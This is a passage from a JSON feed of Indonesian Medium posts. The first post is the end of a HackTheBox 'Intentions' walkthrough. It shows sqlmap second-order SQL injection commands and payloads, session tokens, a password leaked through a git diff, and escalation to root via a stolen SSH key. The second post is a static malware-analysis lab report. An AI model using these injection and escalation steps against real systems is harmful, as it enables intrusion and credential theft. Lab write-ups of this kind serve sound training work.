TOKEN=eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0%3D; intentions session=eyJpdiI6IkdsMXdPTkFORDdLUjJHMTVOcGM0VGc9PSIsInZhbHVlIjoiTmdwZTIvY3pESFdjbnVQZFJON2lsUnhPdXF0eG53RDFiUW5YTTRWRmFXcFNBeEdRY1dadDFKTUxBS2tSbHhjbXVDQjBxTmxsdVFGUUxaMklWSmJCZmtFUmtCd0lqdExhNUVpUGl2ZTh3UU9XUU8vVzF5MThyTnRFV0FFQWZFeVIiLCJtYWMiOiIwZjk5Yjc0YjJmOTRmYzM4MDU4YTFiNzViZWE5OTkwYzUzNTViZTUwNzY2YjI5Y2YxZWI5Mzg1NThmOThjNGQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3NDg1NjAzLCJleHAiOjE2OTc1MDcyMDMsIm5iZiI6MTY5NzQ4NTYwMywianRpIjoiVUgyb09Oc0NWUEVCdmNuYSIsInN1YiI6IjMwIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3VU1sk2yzmM9Gch4QuUyEeI drctCniqtfbEzSV5sKw<br <br {\"genres\":\"food\"}</pre <p Saya juga menyimpan GET Request /user/feed menjadi file fetchFeedRequest dan akan terlihat seperti berikut :</p <pre GET /api/v1/gallery/user/feed HTTP/1.1<br Host: 10.10.11.220<br User Agent: Mozilla/5.0 (X11; Linux x86 64; rv:109.0) Gecko/20100101 Firefox/115.0<br Accept: application/json, text/plain, / <br Accept Language: en US,en;q=0.5<br Accept Encoding: gzip, deflate<br X Requested With: XMLHttpRequest<br X XSRF TOKEN: eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0=<br Connection: close<br Referer: http://10.10.11.220/gallery<br Cookie: XSRF TOKEN=eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0%3D; intentions session=eyJpdiI6IkdsMXdPTkFORDdLUjJHMTVOcGM0VGc9PSIsInZhbHVlIjoiTmdwZTIvY3pESFdjbnVQZFJON2lsUnhPdXF0eG53RDFiUW5YTTRWRmFXcFNBeEdRY1dadDFKTUxBS2tSbHhjbXVDQjBxTmxsdVFGUUxaMklWSmJCZmtFUmtCd0lqdExhNUVpUGl2ZTh3UU9XUU8vVzF5MThyTnRFV0FFQWZFeVIiLCJtYWMiOiIwZjk5Yjc0YjJmOTRmYzM4MDU4YTFiNzViZWE5OTkwYzUzNTViZTUwNzY2YjI5Y2YxZWI5Mzg1NThmOThjNGQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3NDg1NjAzLCJleHAiOjE2OTc1MDcyMDMsIm5iZiI6MTY5NzQ4NTYwMywianRpIjoiVUgyb09Oc0NWUEVCdmNuYSIsInN1YiI6IjMwIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3VU1sk2yzmM9Gch4QuUyEeI drctCniqtfbEzSV5sKw</pre <p Pada tahap ini kita akan melakukan evaluasi request diatas apakah memungkinkan untuk dilakukan SQL Injection menggunakan <strong Sqlmap</strong .</p <h3 Fitur “Update Genres”</h3 <pre sqlmap r updateGenresRequest batch</pre <p Command diatas merupakan basic scan <strong sqlmap</strong untuk updateGenresRequest akan tetapi tidak berhasil.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qtb NJCxO1pBTqqb0Yokrw.png\" </figure <h3 Kombinasi Update Request dan Fetch Feed Request</h3 <p Selanjutnya, kita mencoba scan kedua request menggunakan <strong sqlmap</strong , akan tetapi masih belum berhasil.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 1a3S68bS5JvmlNiqFUFWsA.png\" </figure <p Akan tetapi dapat terlihat pada form “favourite genres” secara langsung terhubung dengan feed kita. Maka selanjutnya kita coba eksplorasi teknik lainnya, terlihat <strong sqlmap</strong menyarankan untuk menggunakan tamper script.</p <pre maybe you could try to use option ' tamper' (e.g. ' tamper=space2comment')<br and/or switch ' random agent'</pre <p Jika kita berinteraksi secara manual dengan endpoint terlihat pada request update genre, kita dapat mengamati bahwa request dengan <em spasi</em seperti ‘nature, animals, test’ akan menjadi ‘nature,animals,test’. Dan saat berikutnya kita mengunjungi halaman, menunjukkan bahwa spasi secara aktif dihapus. Disini saya langsung mencoba untuk melakukan pemeriksaan SQLi tingkat kedua dengan Tamper Script untuk mengubah spasi :</p <pre sqlmap r updateGenresRequest second req=fetchFeedRequest dbms=MySQL batch tamper=space2comment level=5</pre <pre Note: Sometimes this may only identify a time based SQL injection, at which point we can optionally extend our check by specifying dbms=MySQL level=5</pre <p Finally! kita berhasil melakukan SQL Injection dengan result sebagai berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 TyhV7sz20ULkj9GYR9WPUg.png\" </figure <pre Parameter: JSON genres ((custom) POST)<br Type: boolean based blind<br Title: AND boolean based blind WHERE or HAVING clause<br Payload: {\"genres\":\"food’) AND 6484=6484 AND (‘GWSr’=’GWSr\"}<br Type: time based blind<br Title: MySQL &gt;= 5.0.12 AND time based blind (query SLEEP)<br Payload: {\"genres\":\"food’) AND (SELECT 6006 FROM (SELECT(SLEEP(5)))GiDV) AND (‘jDDu’=’jDDu\"}<br Type: UNION query<br Title: MySQL UNION query (NULL) 5 columns<br Payload: {\"genres\":\"food') UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x4a68777a6e676465764b7a46776854567759646c4d61536a7678516b6f52476e4446676556564a57,0x717a7a7171),NULL,NULL \"}<br +<br | gallery images |<br | migrations |<br | personal access tokens |<br | users |<br + a/tests/Feature/Helper.php<br +++ b/tests/Feature/Helper.php<br @@ 8,12 +8,14 @@ class Helper extends TestCase<br {<br public static function getToken($test, $admin = false) {<br if($admin) {<br $res = $test &gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);<br return $res &gt;headers &gt;get('Authorization');<br + $user = User::factory() &gt;admin() &gt;create();<br } <br else {<br $res = $test &gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg user@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);<br return $res &gt;headers &gt;get('Authorization');<br + $user = User::factory() &gt;create();<br }<br + <br + $token = Auth::login($user);<br + $user &gt;delete();<br + return $token;<br }<br }</pre <p Disini bisa dilihat saya menemukan kata sandi (Gr3g1sTh3B3stDev3l0per!1998!) pada riwayat commit, yang dapat digunakan untuk SSH ke dalam kotak sebagai user greg.</p <pre ssh greg@intentions.htb</pre <pre greg@intentions: $ id<br uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)</pre <p Disini bisa dilihat bahwa user greg adalah bagian dari Scanner group, dan user flag bisa ditemukan pada path “/home/greg/flag.txt”.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/764/1 6Ajt e xFR7LLy6iSaN0eA.png\" </figure <h3 Privilage Escalation</h3 <p Ketika berhasil autentikasi menggunakan user greg, kita melihat file menarik pada direktory. <strong dmca check.sh</strong dan <strong dmca hashes.test</strong </p <pre total 52<br drwxr x 1 root greg 75 Jun 10 17:33 dmca check.sh<br rwxr 1 root greg 33 Oct 17 05:27 user.txt<br rw r r 1 greg greg 39 Jun 14 10:18 .vimrc</pre <p Pada <strong dmca chech.sh</strong kita bisa melihat bahwa file tersebut meng eksekusi command berikut :</p <pre /opt/scanner/scanner d /home/legal/uploads h /home/greg/dmca hashes.test</pre <p Pada saat menjalankan Command diatas, terlihat output seperti berikut :</p <pre greg@intentions: $ /opt/scanner/scanner d /home/legal/uploads h /home/greg/dmca hashes.test</pre <pre [+] DMCA 1952 matches /home/legal/uploads/zac porter p yotEbRA0A unsplash.jpg</pre <p Terlihat bahwa user greg tidak memiliki akses untuk inpect file tersebut.</p <pre greg@intentions: $ ls /home/legal/uploads/</pre <pre ls: cannot access '/home/legal/uploads/': Permission denied</pre <pre greg@intentions: $ cat /home/legal/uploads/zac porter p yotEbRA0A unsplash.jpg</pre <pre cat: /home/legal/uploads/zac porter p yotEbRA0A unsplash.jpg: Permission denied</pre <p Ini seharusnya menjadi indikasi pertama kami bahwa sesuatu yang tidak biasa terjadi dalam hal kontrol akses pada biner ini. Letika memeriksa biner itu sendiri, kita dapat melihat bahwa itu bukan biner setuid, dan saya tidak menjalankannya dengan sudo:</p <pre greg@intentions: $ ls al /opt/scanner/scanner</pre <pre rwxr x BEGIN OPENSSH PRIVATE KEY END OPENSSH PRIVATE KEY <br Done</pre <p Kita beri nama root key, pastikan untuk memberikan permission yang tepat pada file tersebut dan selanjutnya kita gunakan untuk autentikasi sebagai <strong root</strong pada mesin target.</p <pre chmod 600 root key<br ssh i root root@intentions.htb</pre <pre root@intentions: id<br uid=0(root) gid=0(root) groups=0(root)</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/473/1 5JkfFiRNP8oiQf5 x4YtiA.png\" </figure <p Setelah berhasil login sebagai root, ambil root flag pada file root.txt</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/671/1 6j 0QXbI6C921 J6bFiV1Q.png\" </figure <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=a91356086d2c\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "penetration-testing"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-intentions-hard-a91356086d2c?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-10-17 09:25:08",
    "updatedAt": "2023-10-17 09:25:08",
    "readingTime": 7,
    "cover": null
  },
  {
    "id": "https://medium.com/p/9ec2a10802a7",
    "slug": "https://medium.com/p/9ec2a10802a7",
    "title": "Practical Malware Analysis — Lab 1.1",
    "content": "<h3 Practical Malware Analysis — Lab 1.1</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/850/1 2OPm7aU0Uzk7u9 L3ySv8w.png\" </figure <h4 Basic Static Analysis</h4 <p Tujuan dari analisis statis malware adalah untuk memahami karakteristik dan fitur malware tanpa menjalankannya secara aktif. Dengan menganalisis struktur berkas, kode biner, dan komponen lain dari sampel malware, tujuan ini mencakup mengidentifikasi tanda tanda ancaman, mengungkapkan taktik pengaburan yang digunakan oleh penyerang, dan mendapatkan pemahaman awal tentang perilaku malware.</p <p Berikut informasi dasar terkait File Malware yang akan kita analisa :</p <pre Nama Malware : Mal01 01.dll<br Jenis Malware : Trojan/Win32<br SHA256 : f50e42c8dfaab649bde0398867e930b86c2a599e8db83b8260393082268f2dba<br SHA 1 : a4b35de71ca20fe776dc72d12fb2886736f43c22 <br MD5 : 290934c61de9176ad682ffdd65f0a669 </pre <pre Nama Malware : Mal01 01.exe <br Jenis Malware : Trojan/Win32<br SHA256 : 58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47 <br SHA 1 : 9dce39ac1bd36d877fdb0025ee88fdaff0627cdb <br MD5 : bb7425b82141a1c0f7d60e5106676bb1 </pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 eI050nuhy r9LvR4RSZYbg.png\" <figcaption VT Result For Mal01–01.dll</figcaption </figure <p 34/68 Antivirus mendeteksi File <em .dll</em sebagai Malicious Trojan.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 0sFTyXzNSUgv5Tho MIVkg.png\" <figcaption VT Result For Mal01–01.exe</figcaption </figure <p sedangkan untuk file <em .exe </em sebanyak 52/71 Antivirus juga mendeteksi sebagai Malicious Trojan.</p <h4 <strong Lingkungan Analisis</strong </h4 <p Analisis malware dilakukan dalam lingkungan yang terisolasi dan aman untuk mencegah penyebaran dan dampak negatif yang lebih luas. Lingkungan ini dirancang khusus untuk menganalisis sampel malware tanpa mengorbankan keamanan dan integritas sistem utama.</p <ul <li Virtual Machine (VM) : FlareVM</li <li Tools : Depedency Walker, PE Studio Pro, PEview, CFF Explorer</li </ul <h4 Static Analysis</h4 <ol <li Informasi Malware:</li </ol <ul <li Tipe : Executable (EXE)</li <li Ekstensi : <em .exe</em </li <li Metadata : N/A</li <li Signature : Microsoft Visual C++ 6.0 DLL (Debug)</li <li Waktu Pembuatan : 19 Desember 2010, 16:16:38</li </ul <p 2. Struktur Malware</p <ul <li <strong Tabel Eksekusi (Section Table)</strong : Terdapat beberapa bagian (sections) seperti “.text”, “.data”, “.rdata”, dan “.reloc” dalam berkas yang mengandung kode, data, sumber daya, dan informasi impor.</li <li <strong Entry Point</strong : 00001820</li </ul <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1003/1 Xxp92s78bhII06ZJd VQng.png\" <figcaption Entry Point</figcaption </figure <pre <br Mal01 01.exe:<br Virtual Size: 970<br Size of Raw Data: 1000<br Mal01 01.dll:<br Virtual Size: 39E<br Size of Raw Data: 1000</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/868/1 Lgz8 eOmHOZeN1STa6fbA.png\" <figcaption IMPORT Address Table</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/853/1 M5xHufH1uL6eC02MZOBm w.png\" <figcaption IMPORT Directory Table</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/643/1 uyJjYoTDBfeah7Zjj7fnAw.png\" <figcaption IMPORT Name Table</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/998/1 SprAYDSRbZNDj89qAf2u3Q.png\" <figcaption IMPORT Hints &amp; DLL Names</figcaption </figure <ul <li Header Malware :</li </ul <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/794/1 MKOF7sA5bNFFS1fNBkB rw.png\" <figcaption Header Information</figcaption </figure <p <strong Analisis Kode</strong </p <ol <li Analisis Strings</li </ol <ul <li <strong Mal01–01.exe</strong </li </ul <p File ini melakukan operasi sistem file yang sama, karena memuat beberapa fungsi. Beberapa dari fungsi ini memungkinkan program untuk mencari file,membuat serta menyalin file.</p <pre ======================<br KERNEL32.dll<br ======================<br UnmapViewOfFile<br MapViewOfFile<br CreateFileMappingA<br CreateFileA<br FindClose<br FindNextFileA<br FindFirstFileA<br CopyFileA</pre <p Deskripsi mengenai pemanggilan fungsi API Windows pada file <em Mal01–01.exe</em adalah sebagai berikut :</p <ol <li UnmapViewOfFile :</li </ol <ul <li Fungsi untuk memutuskan pemetaan (mapping) dari alamat memori yang telah di mapping sebelumnya.</li <li Digunakan untuk melepaskan pemetaan memori setelah selesai penggunaan.</li </ul <p 2. MapViewOfFile :</p <ul <li Fungsi untuk membuat pemetaan memori dari suatu berkas ke dalam ruang alamat memori proses.</li <li Digunakan untuk memungkinkan akses berkas seolah olah itu adalah bagian dari memori.</li </ul <p 3. CreateFileMappingA :</p <ul <li Fungsi untuk membuat objek berkas mapping yang dapat digunakan oleh berbagai proses.</li <li Digunakan untuk berbagi data di antara proses dengan membuat pemetaan berkas ke dalam memori bersama.</li </ul <p 4. CreateFileA :</p <ul <li Fungsi untuk membuka atau membuat berkas.</li <li Digunakan untuk mengakses atau menciptakan berkas dengan parameter seperti nama berkas, hak akses, dan atribut.</li </ul <p 5. FindClose :</p <ul <li Fungsi untuk menutup handle pencarian yang dibuka sebelumnya menggunakan fungsi FindFirstFile atau FindNextFile.</li <li Digunakan untuk membersihkan sumber daya setelah selesai pencarian berkas.</li </ul <p 6. FindNextFileA :</p <ul <li Fungsi untuk menemukan berkas berikutnya yang sesuai dengan pola pencarian setelah pemanggilan FindFirstFile.</li <li Digunakan dalam pencarian berkas berdasarkan kriteria tertentu.</li </ul <p 7. FindFirstFileA :</p <ul <li Fungsi untuk memulai pencarian berkas dengan pola pencarian tertentu.</li <li Digunakan untuk mencari berkas pertama yang sesuai dengan kriteria pencarian.</li </ul <p 8. CopyFileA :</p <ul <li Fungsi untuk menyalin berkas dari lokasi sumber ke lokasi tujuan.</li <li Digunakan untuk melakukan salinan berkas dengan parameter seperti nama berkas sumber dan tujuan.</li </ul <p Berikut hasil capture Strings dari file <em .exe </em :</p <pre strings Mal01 01.exe<br ...<br kerne132.dll<br kernel32.dll<br .exe<br C:\\ <br C:\\windows\\system32\\kerne132.dll<br Kernel32.<br Mal01 01.dll<br C:\\Windows\\System32\\Kernel32.dll<br WARNING THIS WILL DESTROY YOUR MACHINE</pre <p File ini tampaknya melakukan beberapa operasi dengan file bernama <em Mal01–01.dll </em dan Juga melakukan sesuatu dengan kernel32.dll bawaan library windows, ada indikasi bahwa file tersebut di modifikasi, karena kita dapat melihat file lain yang disebut kerne132.dll, dengan huruf L berubah untuk menjadi angka ‘1’.</p <ul <li <strong Mal01–01.dll</strong </li </ul <p Sedangkan untuk file ini melakukan beberapa operasi jaringan dan proses, seperti membuat mutex atau proses baru, berdasarkan fungsi yang diimpor.</p <pre ======================<br KERNEL32.dll<br ======================<br Sleep<br CreateProcessA<br CreateMutexA<br OpenMutexA<br CloseHandle<br <br ======================<br WS2 32.dll<br ======================<br socket<br WSAStartup<br inet addr<br connect<br send<br shutdown<br recv<br closesocket<br WSACleanup<br htons</pre <p Berikut adalah deskripsi singkat dari pemanggilan fungsi API yang terdapat pada file <em Mal01–01.dll</em :</p <ol <li Sleep: Fungsi ini menghentikan eksekusi program untuk jangka waktu tertentu. Biasanya digunakan untuk menambahkan penundaan dalam eksekusi, yang dapat digunakan dalam teknik penghindaran analisis atau untuk mengatur jangka waktu tertentu dalam eksploitasi.</li <li CreateProcessA: Fungsi ini digunakan untuk membuat proses baru. Itu dapat digunakan untuk menjalankan berkas atau aplikasi lain dengan parameter yang ditentukan. Dalam konteks malware, dapat digunakan untuk menjalankan komponen berbahaya atau eksekusi tambahan.</li <li CreateMutexA: Fungsi ini digunakan untuk membuat objek mutex (synchronizing primitive) dengan nama yang ditentukan. Dalam pengaturan malware, dapat digunakan untuk menghindari eksekusi ganda atau untuk mengidentifikasi apakah malware sudah berjalan sebelumnya.</li <li OpenMutexA: Fungsi ini digunakan untuk membuka objek mutex yang sudah ada dengan nama yang ditentukan. Digunakan untuk memeriksa apakah mutex sudah ada dan apakah malware telah berjalan sebelumnya.</li <li CloseHandle: Fungsi ini digunakan untuk menutup handle objek yang dibuka sebelumnya, seperti handle proses atau handle berkas. Menghindari kebocoran sumber daya.</li <li socket: Fungsi ini digunakan untuk membuat soket yang dapat digunakan untuk komunikasi jaringan. Ini adalah langkah awal dalam membangun koneksi jaringan.</li <li WSAStartup: Fungsi ini menginisialisasi pustaka Winsock yang diperlukan untuk berkomunikasi melalui soket dalam lingkungan Windows.</li <li inet addr: Fungsi ini digunakan untuk mengonversi alamat IP dalam format string menjadi bentuk yang dapat dikenali oleh komputer.</li <li connect: Fungsi ini digunakan untuk menghubungkan soket dengan alamat IP dan nomor port tertentu untuk membentuk koneksi jaringan.</li <li send: Fungsi ini digunakan untuk mengirim data melalui soket yang sudah terhubung.</li <li shutdown: Fungsi ini digunakan untuk mengakhiri koneksi jaringan yang sudah terhubung.</li <li recv: Fungsi ini digunakan untuk menerima data melalui soket yang sudah terhubung.</li <li closesocket: Fungsi ini digunakan untuk menutup soket yang sudah tidak digunakan lagi.</li <li WSACleanup: Fungsi ini membersihkan inisialisasi pustaka Winsock setelah selesai digunakan.</li <li htons: Fungsi ini digunakan untuk mengonversi nomor port dalam format host menjadi format jaringan.</li </ol <p Pemanggilan fungsi API ini mencerminkan interaksi malware dengan sistem operasi dan jaringan. Dalam konteks analisis malware, pemahaman tentang fungsi fungsi ini membantu dalam mengidentifikasi perilaku dan tujuan yang mungkin terkait dengan aktivitas berbahaya.</p <p Berikut hasil Strings Capture dari file <em .dll</em </p <pre strings Mal01 01.dll<br ...<br hello<br 127.26.152.13<br SADFHUHF<br ...</pre <p Kita dapat melihat terdapat alamat IP yang menandakan bahwa alamat IP tersebut merupakan alamat C&amp;C. Dan juga terdapat string <em SADFHUHF</em bisa menjadi nama mutex yang dibuat oleh malware.</p <p <strong Kesimpulan</strong </p <p Berdasarkan hasil analisa di atas, bahwa eksekusi digunakan untuk menjalankan DLL yang berperan sebagai <em Backdoor </em atau Remote Access Trojan(RAT). Dilihat dari impor yang dilakukan, saat file <em .exe </em dijalankan akan mencari file C:\\windows\\system32\\kerne132.dll, dan jika tidak ditemukan, kemungkinan akan mencoba menyalin DLL berbahaya ke lokasi C:\\windows\\system32\\kerne132.dll. Setelah menjalankan DLL tersebut, terlihat bahwa ada komunikasi dengan server C2 di alamat IP 127.26.152.13.</p <ul <li Mal01–01.exe : file ini menyalin file <em Mal01–01.dll</em ke <em C:\\windows\\system32\\</em dengan nama <em kerne132.dll</em (mengubah <em L</em menjadi <em 1</em ).</li <li Mal01–01.dll: file ini menjalankan beberapa proses dan melakukan beberapa permintaan jaringan ke alamat IP <em 127.26.152.13</em .</li </ul <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=9ec2a10802a7\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 Practical Malware Analysis — Lab 1.1</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/850/1 2OPm7aU0Uzk7u9 L3ySv8w.png\" </figure <h4 Basic Static Analysis</h4 <p Tujuan dari analisis statis malware ad…",
    "description": "<h3 Practical Malware Analysis — Lab 1.1</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/850/1 2OPm7aU0Uzk7u9 L3ySv8w.png\" </figure <h4 Basic Static Analysis</h4 <p Tujuan dari analisis statis malware adalah untuk memahami karakteristik dan fitur malware tanpa menjalankannya secara aktif. Dengan menganalisis struktur berkas, kode biner, dan komponen lain dari sampel malware, tujuan ini mencakup mengidentifikasi tanda tanda ancaman, mengungkapkan taktik pengaburan yang digunakan oleh penyerang, dan mendapatkan pemahaman awal tentang perilaku malware.</p <p Berikut informasi dasar terkait File Malware yang akan kita analisa :</p <pre Nama Malware : Mal01 01.dll<br Jenis Malware : Trojan/Win32<br SHA256 : f50e42c8dfaab649bde0398867e930b86c2a599e8db83b8260393082268f2dba<br SHA 1 : a4b35de71ca20fe776dc72d12fb2886736f43c22 <br MD5 : 290934c61de9176ad682ffdd65f0a669 </pre <pre Nama Malware : Mal01 01.exe <br Jenis Malware : Trojan/Win32<br SHA256 : 58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47 <br SHA 1 : 9dce39ac1bd36d877fdb0025ee88fdaff0627cdb <br MD5 : bb7425b82141a1c0f7d60e5106676bb1 </pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 eI050nuhy r9LvR4RSZYbg.png\" <figcaption VT Result For Mal01–01.dll</figcaption </figure <p 34/68 Antivirus mendeteksi File <em .dll</em sebagai Malicious Trojan.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 0sFTyXzNSUgv5Tho MIVkg.png\" <figcaption VT Result For Mal01–01.exe</figcaption </figure <p sedangkan untuk file <em .exe </em sebanyak 52/71 Antivirus juga mendeteksi sebagai Malicious Trojan.</p <h4 <strong Lingkungan Analisis</strong </h4 <p Analisis malware dilakukan dalam lingkungan yang terisolasi dan aman untuk mencegah penyebaran dan dampak negatif yang lebih luas. Lingkungan ini dirancang khusus untuk menganalisis sampel malware tanpa mengorbankan keamanan dan integritas sistem utama.</p <ul <li Virtual Machine (VM) : FlareVM</li <li Tools : Depedency Walker, PE Studio Pro, PEview, CFF Explorer</li </ul <h4 Static Analysis</h4 <ol <li Informasi Malware:</li </ol <ul <li Tipe : Executable (EXE)</li <li Ekstensi : <em .exe</em </li <li Metadata : N/A</li <li Signature : Microsoft Visual C++ 6.0 DLL (Debug)</li <li Waktu Pembuatan : 19 Desember 2010, 16:16:38</li </ul <p 2. Struktur Malware</p <ul <li <strong Tabel Eksekusi (Section Table)</strong : Terdapat beberapa bagian (sections) seperti “.text”, “.data”, “.rdata”, dan “.reloc” dalam berkas yang mengandung kode, data, sumber daya, dan informasi impor.</li <li <strong Entry Point</strong : 00001820</li </ul <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1003/1 Xxp92s78bhII06ZJd VQng.png\" <figcaption Entry Point</figcaption </figure <pre <br Mal01 01.exe:<br Virtual Size: 970<br Size of Raw Data: 1000<br Mal01 01.dll:<br Virtual Size: 39E<br Size of Raw Data: 1000</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/868/1 Lgz8 eOmHOZeN1STa6fbA.png\" <figcaption IMPORT Address Table</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/853/1 M5xHufH1uL6eC02MZOBm w.png\" <figcaption IMPORT Directory Table</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/643/1 uyJjYoTDBfeah7Zjj7fnAw.png\" <figcaption IMPORT Name Table</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/998/1 SprAYDSRbZNDj89qAf2u3Q.png\" <figcaption IMPORT Hints &amp; DLL Names</figcaption </figure <ul <li Header Malware :</li </ul <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/794/1 MKOF7sA5bNFFS1fNBkB rw.png\" <figcaption Header Information</figcaption </figure <p <strong Analisis Kode</strong </p <ol <li Analisis Strings</li </ol <ul <li <strong Mal01–01.exe</strong </li </ul <p File ini melakukan operasi sistem file yang sama, karena memuat beberapa fungsi. Beberapa dari fungsi ini memungkinkan program untuk mencari file,membuat serta menyalin file.</p <pre ======================<br KERNEL32.dll<br ======================<br UnmapViewOfFile<br MapViewOfFile<br CreateFileMappingA<br CreateFileA<br FindClose<br FindNextFileA<br FindFirstFileA<br CopyFileA</pre <p Deskripsi mengenai pemanggilan fungsi API Windows pada file <em Mal01–01.exe</em adalah sebagai berikut :</p <ol <li UnmapViewOfFile :</li </ol <ul <li Fungsi untuk memutuskan pemetaan (mapping) dari alamat memori yang telah di mapping sebelumnya.</li <li Digunakan untuk melepaskan pemetaan memori setelah selesai penggunaan.</li </ul <p 2. MapViewOfFile :</p <ul <li Fungsi untuk membuat pemetaan memori dari suatu berkas ke dalam ruang alamat memori proses.</li <li Digunakan untuk memungkinkan akses berkas seolah olah itu adalah bagian dari memori.</li </ul <p 3. CreateFileMappingA :</p <ul <li Fungsi untuk membuat objek berkas mapping yang dapat digunakan oleh berbagai proses.</li <li Digunakan untuk berbagi data di antara proses dengan membuat pemetaan berkas ke dalam memori bersama.</li </ul <p 4. CreateFileA :</p <ul <li Fungsi untuk membuka atau membuat berkas.</li <li Digunakan untuk mengakses atau menciptakan berkas dengan parameter seperti nama berkas, hak akses, dan atribut.</li </ul <p 5. FindClose :</p <ul <li Fungsi untuk menutup handle pencarian yang dibuka sebelumnya menggunakan fungsi FindFirstFile atau FindNextFile.</li <li Digunakan untuk membersihkan sumber daya setelah selesai pencarian berkas.</li </ul <p 6. FindNextFileA :</p <ul <li Fungsi untuk menemukan berkas berikutnya yang sesuai dengan pola pencarian setelah pemanggilan FindFirstFile.</li <li Digunakan dalam pencarian berkas berdasarkan kriteria tertentu.</li </ul <p 7. FindFirstFileA :</p <ul <li Fungsi untuk memulai pencarian berkas dengan pola pencarian tertentu.</li <li Digunakan untuk mencari berkas pertama yang sesuai dengan kriteria pencarian.</li </ul <p 8. CopyFileA :</p <ul <li Fungsi untuk menyalin berkas dari lokasi sumber ke lokasi tujuan.</li <li Digunakan untuk melakukan salinan berkas dengan parameter seperti nama berkas sumber dan tujuan.</li </ul <p Berikut hasil capture Strings dari file 